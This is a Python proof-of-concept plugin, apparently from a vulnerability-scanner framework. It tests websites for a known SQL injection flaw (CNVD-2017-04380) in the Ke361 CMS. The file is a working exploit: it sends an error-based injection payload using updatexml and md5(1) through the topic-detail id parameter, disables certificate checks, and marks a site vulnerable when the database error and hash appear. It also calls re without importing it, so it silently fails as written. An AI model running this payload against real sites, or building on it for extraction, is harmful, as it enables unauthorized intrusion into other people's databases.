#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/cms/Ke361/Ke361 TopicController.class.php SQL注入漏洞 CNVD-2017-04380.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Ke361 TopicController.class.php SQL注入漏洞 CNVD-2017-04380',

      'level'     :   'high',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/index.php?s=/Topic/detail/id/1)%20%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'XPATH syntax error.*?',res.text,re.S) and 'c4ca4238a' in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret